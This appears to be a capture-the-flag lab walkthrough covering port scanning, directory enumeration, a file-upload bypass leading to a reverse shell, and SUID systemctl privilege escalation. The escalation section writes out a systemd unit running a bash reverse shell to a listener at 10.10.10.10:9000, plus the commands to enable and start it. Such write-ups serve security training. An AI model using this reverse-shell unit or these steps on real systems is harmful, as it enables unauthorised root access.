# #1: Reconnaissance 

Reconnaissance is act of gathering information about the target. 

## Practical

### Nmap

![1d1166f1df36477c0481153e9b4b496d.png](_resources/5c6bb67840e94c87befa6cc5c0fc7c54.png)

Scan through all port 
```
$ nmap -p- --min-rate 1000 -oN all-port 10.10.231.160 -v
```
![ca10d8e44625cef38ea6be3a16f8f849.png](_resources/ae01612d2a3b470aadec519e84617b87.png)

Determine the version of the running services
```
$ nmap -p21,22,139,445,3128,3333 -sC -sV -oN all-port-scan 10.10.231.160 -v
```

## Questions

![6cfd513425cca8de18e828d4e6aeb443.png](_resources/3c30c14785644f9d8b08f0797d4d2e21.png)

# #2: Locating directories using GoBuster 

## Practical

### Gobuster
```
$ gobuster dir -u http://10.10.231.160:3333 -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o discovered.txt
```

![98f7337b2a06c617531d63f87e6932c4.png](_resources/2e97316d8e33467990e0e2b516911f72.png)

Result:
```
/images               (Status: 301) [Size: 322] [--> http://10.10.231.160:3333/images/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.231.160:3333/js/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.231.160:3333/css/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.231.160:3333/internal/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.231.160:3333/fonts/]
/server-status        (Status: 403) [Size: 303]
```

## Questions
![c8ae9808ee8ee657bf52e79f61420a5a.png](_resources/d1cd1eaa9168482d869328121ef3728b.png)
  
# #3 Compromise the webserver 

## Practical

Visit the uploads page 

```
http://machine_ip:3333/internal/index.php
```

![38103265ff226ec22d1af4e27add68ed.png](_resources/6f92a893665c40b4ae99df6a52a50b7d.png)

### Fuzzing File Extension 

Payload position  

![9bba3d03abb99098428a6c7039553cee.png](_resources/aee12aca45e341c6a092853c79df5d41.png)

Wordlist

![6ef65443dd45b444d2c09f3ba0b36d8e.png](_resources/7242d06ca3af4558b4232e20a4be0125.png)

Start attack and notice the page length

![4a64d3a359f0ef4e0e1213ca9265c9c0.png](_resources/52cc839834f649af8f7c38273fd7d915.png)

Send reverse shell

![2ec6da3c8767e4b27c51220bbfb258b7.png](_resources/7d355abc6f1446f8bcfe8cc79727e54b.png)

Determine upload location

![dc84ba97630550ba19ce63add027292b.png](_resources/88eb323f28c849dd9ca4a8c3ba2f013a.png)

Visit the /internal/uploads/  

![96fd6d16bf89b38f5435323d0eb0d633.png](_resources/d02e322229e44537b3063ac0ab2138f3.png)

Execute the reverse shell.  

![7ee43fbc3e31fd11c31a6064202e339f.png](_resources/57aad1e798cb4d95b2c393acd01021f6.png)

## Questions

![bfd8bc27944b17eca0666dcc17f978c2.png](_resources/7cc5b89c9930495f9bef56ba009965e2.png)

![56683666ea822cda7c513c2ef6cbde50.png](_resources/0e75f11df885455499f0c27c4818cc10.png)

![207b122b2498ab2e6b16f27cd3212d8b.png](_resources/e7c760b9257241b4876e70ad05d3c377.png)

![72dbfa05ac31adc2c46d4ea97d82234a.png](_resources/7c85718eb4df40f78db1f13e288f0ba7.png)

# #4 Privilege Escalation
Privilege escalation is act of searching potential vector such as exploit bugs, system flaws, or abuse misconfiguration to gain higher privileges (root or administrator) 

There are two types of privilege escalation:
- Horizontal Privilege Escalation, user level to another user
- Vertical Privilege Escalation, user level to super user (root/admin/system)

## Practical

### Abusing SUID
SUID (set owner userId upon execution)

The **find** command can be used to find binary with SUID bit
```
$ find / -type f -perm -u=s 2>/dev/null | grep -v proc
```

systemctl is a utility for managing system and service in Linux. With SUID bit set, it offers a potential [privesc](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) vector.

![c4c2fcba4ad579ba0f626340da39067d.png](_resources/d52a2f3ed3c4435abd3fc35544d011ae.png)


Steps:

1. root.service

    ```
    [Unit]
    Description=im groot

    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9000 0>&1'

    [Install]
    WantedBy=multi-user.target
    ```

2. Host and download it on the target

    ![66a4d593472f33fe22893f5e5b4ef4fc.png](_resources/e890907bf17345f9b4f042b19a7ae1c7.png)

    ![f80d5024437848823cd690f666c70784.png](_resources/49c3b280e284446da2ff3f840332d417.png)

3. Enable root.service and start service

    ```
    $ /bin/systemctl enable /dev/shm/root.service
    ```

    ```
    $ /bin/systemctl start root
    ```

4. Check the listener

![ff7d4260e110a28da6f630dd3bc15cf9.png](_resources/0bed6439af0d4a64a1ad6f3bc63b3267.png)